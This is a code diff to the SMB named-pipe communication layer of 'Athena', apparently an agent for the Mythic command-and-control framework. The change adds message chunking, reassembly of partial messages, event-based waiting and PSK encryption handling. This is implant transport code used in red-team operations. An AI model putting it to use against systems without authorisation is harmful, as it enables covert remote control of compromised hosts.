@@ -2,98 +2,131 @@ using Athena.Models.Mythic.Response;
 using Athena.Utilities;
 using Newtonsoft.Json;
 using System;
+using System.Linq;
 using System.Collections.Concurrent;
 using System.Threading.Tasks;
 using H.Pipes;
 using H.Pipes.Args;
+using System.Threading;
+using System.Collections.Generic;
 
-namespace Athena.Config
+namespace Athena
 {
     public class MythicConfig
     {
         public Smb currentConfig { get; set; }
-        public string uuid { get; set; }
+        public static string uuid { get; set; }
         public DateTime killDate { get; set; }
         public int sleep { get; set; }
         public int jitter { get; set; }
-        public SMBForwarder smbForwarder { get; set; }
+        public Forwarder forwarder { get; set; }
 
         public MythicConfig()
         {
-            this.uuid = "%UUID%";
+            uuid = "%UUID%";
             DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
             this.killDate = kd;
             int sleep = 1; //A 0 sleep causes issues with messaging, so setting it to 1 to help mitigate those issues
             this.sleep = sleep;
             int jitter = 0;
             this.jitter = jitter;
-            this.currentConfig = new Smb(this.uuid, this);
-            this.smbForwarder = new SMBForwarder();
+            this.currentConfig = new Smb();
+            this.forwarder = new Forwarder();
         }
     }
 
     public class Smb
     {
         public string psk { get; set; }
-        private PipeServer<string> serverPipe { get; set; }
+        private PipeServer<DelegateMessage> serverPipe { get; set; }
         public string pipeName = "pipename";
         private bool connected { get; set; }
         public bool encrypted { get; set; }
         public bool encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
         public PSKCrypto crypt { get; set; }
-        public ConcurrentQueue<DelegateMessage> queueIn { get; set; }
+        public BlockingCollection<DelegateMessage> queueIn { get; set; }
+        private ManualResetEvent onEventHappenedSignal = new ManualResetEvent(false);
+        private ManualResetEvent onClientConnectedSignal = new ManualResetEvent(false);
+        private ConcurrentDictionary<string, string> partialMessages = new ConcurrentDictionary<string, string>();
 
-        public Smb(string uuid, MythicConfig config)
+        public Smb()
         {
             this.connected = false;
             this.psk = "AESPSK";
-            this.queueIn = new ConcurrentQueue<DelegateMessage>();
+            this.queueIn = new BlockingCollection<DelegateMessage>();
             if (!string.IsNullOrEmpty(this.psk))
             {
-                this.crypt = new PSKCrypto(uuid, this.psk);
+                this.crypt = new PSKCrypto(MythicConfig.uuid, this.psk);
                 this.encrypted = true;
             }
-            this.serverPipe = new PipeServer<string>(this.pipeName);
-            this.serverPipe.ClientConnected += (o,args) => DoNewConnection();
-            this.serverPipe.ClientDisconnected += (o, args) => DoClientDisconnect();
-            this.serverPipe.MessageReceived += (sender, args) => DoMessageReceive(args);
+            this.serverPipe = new PipeServer<DelegateMessage>(this.pipeName);
+            this.serverPipe.ClientConnected += async (o, args) => await OnClientConnection();
+            this.serverPipe.ClientDisconnected += async (o, args) => await OnClientDisconnect();
+            this.serverPipe.MessageReceived += (sender, args) => OnMessageReceive(args);
             this.serverPipe.StartAsync();
         }
 
-        private async void DoMessageReceive(ConnectionMessageEventArgs<string> args)
+        private async void OnMessageReceive(ConnectionMessageEventArgs<DelegateMessage> args)
         {
             try
             {
                 //Add message to out queue.
-                DelegateMessage dm = JsonConvert.DeserializeObject<DelegateMessage>(args.Message);
-                this.queueIn.Enqueue(dm);
-            }
-            catch
-            {
-                DelegateMessage dm = new DelegateMessage()
+                if (this.partialMessages.ContainsKey(args.Message.uuid))
                 {
-                    c2_profile = "smb",
-                    uuid = "",
-                    message = ""
-                };
+                    if (args.Message.final)
+                    {
+                        string curMessage = args.Message.message;
+
+                        args.Message.message = this.partialMessages[args.Message.uuid] + curMessage;
+                        this.queueIn.Add(args.Message);
+
+                        this.partialMessages.Remove(args.Message.uuid, out _);
+                        onEventHappenedSignal.Set(); //Indicate something happened
+                    }
+                    else //Not Last Message but we already have a value in the partial messages
+                    {
+                        this.partialMessages[args.Message.uuid] += args.Message.message;
+                    }
+                }
+                else //First time we've seen this message
+                {
+                    if (args.Message.final)
+                    {
+                        this.queueIn.Add(args.Message);
+                        onEventHappenedSignal.Set(); //Indicate something happened
+                    }
+                    else
+                    {
+                        this.partialMessages.GetOrAdd(args.Message.uuid, args.Message.message); //Add value to our Collection
+                    }
+                }
+            }
+            catch (Exception e)
+            {
             }
         }
 
-        public async void DoNewConnection()
+        public async Task OnClientConnection()
         {
+            onClientConnectedSignal.Set();
             this.connected = true;
         }
 
-        public async void DoClientDisconnect()
+        public async Task OnClientDisconnect()
         {
             this.connected = false;
+            onEventHappenedSignal.Set(); //Indicate something happened
+            onClientConnectedSignal.Reset();
+            this.partialMessages.Clear();
         }
 
         //Send, wait for a response, and return it to the main functions
         public async Task<string> Send(object obj)
         {
-            //Wait for connection to become available
-            while (!connected) { };
+            if (!connected)
+            {
+                onClientConnectedSignal.WaitOne();
+            }
 
             try
             {
@@ -104,38 +137,76 @@ namespace Athena.Config
                 }
                 else
                 {
-                    json = Misc.Base64Encode(Globals.mc.MythicConfig.uuid + json);
+                    json = await Misc.Base64Encode(MythicConfig.uuid + json);
                 }
 
-                //Submit our message to the mythic server and wait for a response
-                DelegateMessage dm = new DelegateMessage()
+                DelegateMessage dm;
+
+                IEnumerable<string> parts = json.SplitByLength(50000);
+
+                foreach (string part in parts)
                 {
-                    uuid = Globals.mc.MythicConfig.uuid,
-                    message = json,
-                    c2_profile = "smb"
-                };
-                _ = this.serverPipe.WriteAsync(JsonConvert.SerializeObject(dm));
-
-                DelegateMessage res = new DelegateMessage();
-
-                while (!this.queueIn.TryDequeue(out dm)) { if (!connected) {
-                        return ""; 
-                    } };
-
-                //Decrypt and return
-                if (this.encrypted)
-                {
-                    return this.crypt.Decrypt(dm.message);
+                    if (part == parts.Last())
+                    {
+                        dm = new DelegateMessage()
+                        {
+                            uuid = MythicConfig.uuid,
+                            message = part,
+                            c2_profile = "smb",
+                            final = true
+                        };
+                    }
+                    else
+                    {
+                        dm = new DelegateMessage()
+                        {
+                            uuid = MythicConfig.uuid,
+                            message = part,
+                            c2_profile = "smb",
+                            final = false
+                        };
+                    }
+                    await this.serverPipe.WriteAsync(dm);
                 }
-                else
+
+                //Wait for a signal
+                onEventHappenedSignal.WaitOne();
+                if (!connected) //Our event was a client disconnect
                 {
-                    return Misc.Base64Decode(dm.message).Substring(36);
+                    onEventHappenedSignal.Reset(); //Reset the event and return empty
+                    return String.Empty;
+                }
+                else //Our event was a new message
+                {
+                    if (this.queueIn.Count > 0) //Check if we actually got a message
+                    {
+                        dm = this.queueIn.Take(); //Take a value from it
+
+                        onEventHappenedSignal.Reset(); //Reset the event and return
+
+
+                        if (this.encrypted)
+                        {
+                            return this.crypt.Decrypt(dm.message);
+                        }
+
+                        if (!string.IsNullOrEmpty(json))
+                        {
+                            return (await Misc.Base64Decode(dm.message)).Substring(36);
+                        }
+
+                        return String.Empty;
+                    }
+                    else
+                    {
+                        return String.Empty;
+                    }
                 }
             }
-            catch
+            catch (Exception e)
             {
                 this.connected = false;
-                return "";
+                return String.Empty;
             }
         }
     }
